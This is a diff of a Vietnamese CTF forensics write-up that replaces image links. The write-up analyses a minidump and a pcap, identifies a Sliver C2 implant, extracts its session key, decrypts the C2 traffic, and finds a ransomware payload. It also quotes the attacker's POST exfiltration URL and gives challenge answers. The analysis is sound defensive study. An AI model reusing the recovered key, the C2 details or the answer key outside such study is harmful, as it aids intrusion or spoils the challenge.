 &lt;p&gt;&lt;strong&gt;Question 1&lt;/strong&gt;
 ta sử dụng Windbg để debug file minidump
-&lt;img src=&quot;https://hackmd.io/_uploads/r1yhusor1x.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/r1yhusor1x.png&quot; alt=&quot;image&quot; /&gt;
 chương trình đã bị crash tại process AMUSED_MILKSHAKE
 tiến hành dump process đó ra kiểm tra với&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HyVNYioSkg.png&quot; alt=&quot;image&quot; /&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/HyVNYioSkg.png&quot; alt=&quot;image&quot; /&gt;
 đây là thông tin của module
 dùng lệnh &lt;strong&gt;.writemem &apos;%USER PROFILE%\outputfolder...&apos; start end&lt;/strong&gt;&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;.writemem C:\Users\Username\Downloads\AMUSED_MILKSHAKE.bin 00920000 01a11000
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Khi có file ta đưa vào virustotal để quick scan
-&lt;img src=&quot;https://hackmd.io/_uploads/BJOE5ojSkl.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/BJOE5ojSkl.png&quot; alt=&quot;image&quot; /&gt;
 ta có thể thấy đây là một trojan sliver
 search google sliver framework
-&lt;img src=&quot;https://hackmd.io/_uploads/HyQq5ooSye.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/HyQq5ooSye.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Đáp án 1 :&lt;/strong&gt; sliver&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Question2:&lt;/strong&gt;
 Check file pcap ta thấy được các gói http nghi vấn đến từ 192.169.1.108 chứa các chuỗi hex, base64, words lạ
-&lt;img src=&quot;https://hackmd.io/_uploads/B1hZojoryx.png&quot; alt=&quot;image&quot; /&gt;
-&lt;img src=&quot;https://hackmd.io/_uploads/SJM7iisS1x.png&quot; alt=&quot;image&quot; /&gt;
-&lt;img src=&quot;https://hackmd.io/_uploads/rkSVjsjBkg.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/B1hZojoryx.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/SJM7iisS1x.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/rkSVjsjBkg.png&quot; alt=&quot;image&quot; /&gt;
 &lt;strong&gt;Đáp án 2 :&lt;/strong&gt; 192.168.1.108&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Question3:&lt;/strong&gt;
 sau khi đã biết được attacker sử dụng Sliver-C2 framework
 tìm các bài blog có liên quan
 https://www.immersivelabs.com/blog/detecting-and-decrypting-sliver-c2-a-threat-hunters-guide&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/Hy_Z2osS1g.png&quot; alt=&quot;image&quot; /&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/Hy_Z2osS1g.png&quot; alt=&quot;image&quot; /&gt;
 trong blog có nói rõ về cách extract session key từ memory dump
 session key dùng để decrypt các payload trên network traffic
-&lt;img src=&quot;https://hackmd.io/_uploads/HkX8hosBke.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/HkX8hosBke.png&quot; alt=&quot;image&quot; /&gt;
 Không may mắn là ta phải tìm key theo cách thủ công với Hex
 và thu nhỏ phạm vi tìm kiếm với Pattern&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;Filter:
@@ -4255,30 +4255,30 @@ do không có dấu hiệu payload ở DNS nên ta chỉ filter cho http&lt;/p&g
 &lt;p&gt;xong sử dụng sliver_decrypt.py cùng với key session để decrypt file http_message.json&lt;/p&gt;
 &lt;p&gt;như có vẻ không hoạt động tốt
 sau vài giờ kiểm tra tôi biết vấn đề nằm ở các định dạng file http-message.json&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rkZ3F2sBJg.png&quot; alt=&quot;image&quot; /&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/rkZ3F2sBJg.png&quot; alt=&quot;image&quot; /&gt;
 ta thấy các định dạng đã được đưa về hex không đúng như định dạng trong script decrypt
 ở chỗ words tôi bôi đỏ
-&lt;img src=&quot;https://hackmd.io/_uploads/rkgMqhoHye.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/rkgMqhoHye.png&quot; alt=&quot;image&quot; /&gt;
 đúng định dạng phải như này
 và gzip-b64 tôi sẽ đưa về b64 để dễ cho script decrypt hoạt động tốt tránh lỗi trong việc xử lý gunzip
-&lt;img src=&quot;https://hackmd.io/_uploads/ry0U93jryx.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/ry0U93jryx.png&quot; alt=&quot;image&quot; /&gt;
 lúc này tôi sẽ sử dụng file http-message.json
-&lt;img src=&quot;https://hackmd.io/_uploads/SJIj5hoHJx.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/SJIj5hoHJx.png&quot; alt=&quot;image&quot; /&gt;
 làm tương tự với các process trong file http-message.json
 sau khi đã sửa file http-message ta decrypt được&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;─$ python sliver_decrypt.py --key 11f4e5b7e21870c8f44143464b1b80b7b03f9852d782ef6d90b81f626f291401 --transport http --file_path fixed_http-sessions.json &amp;gt; file_payload
 
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;ta có được payload
-&lt;img src=&quot;https://hackmd.io/_uploads/B1g2nhjrkg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;/images/hackmd/B1g2nhjrkg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;sau xong ta lấy tất cả hex của message data đem đi decode probobuf
 https://protobuf-decoder.netlify.app/&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/BkOPp3jSye.png&quot; alt=&quot;image&quot; /&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/BkOPp3jSye.png&quot; alt=&quot;image&quot; /&gt;
 file payload chưa được decode protobuf
 bây giờ vào link trên để decode
 khi decode ta thấy đây là một cuộc tấn công ransomware
 folder dc nhắm tới C:\Users\Administrator\Downloads&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/BJ1EA2iryx.png&quot; alt=&quot;image&quot; /&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/BJ1EA2iryx.png&quot; alt=&quot;image&quot; /&gt;
 khi chưa encrypt ransomware
 các file&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;C:\Users\Administrator\Downloads
@@ -4329,9 +4329,9 @@ các file&lt;/p&gt;
 &lt;p&gt;ta thấy đã bị xóa 2 file 781724.png-secret.txt
 ** đáp án câu 4: 781724.png-secret.txt**&lt;/p&gt;
 &lt;p&gt;Question 5 : có file sample.png&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SJt1WpiHye.png&quot; alt=&quot;image&quot; /&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackmd/SJt1WpiHye.png&quot; alt=&quot;image&quot; /&gt;
 ta thấy dưới có payload được attacker gửi về server thông qua lệnh POST với request url http://192.168.1.108/oauth2/api/namespaces/oauth/oauth2/oauth2/samples.php?s=94728974
-&lt;img src=&quot;https://hackmd.io/_uploads/HkB3Waorye.png&quot; alt=&quot;image&quot; /&gt;
+&lt;img src=&quot;/images/hackmd/HkB3Waorye.png&quot; alt=&quot;image&quot; /&gt;
 &lt;strong&gt;đáp án : notepad&lt;/strong&gt;
 Question 6 : temp.exe
 Question 7: enc
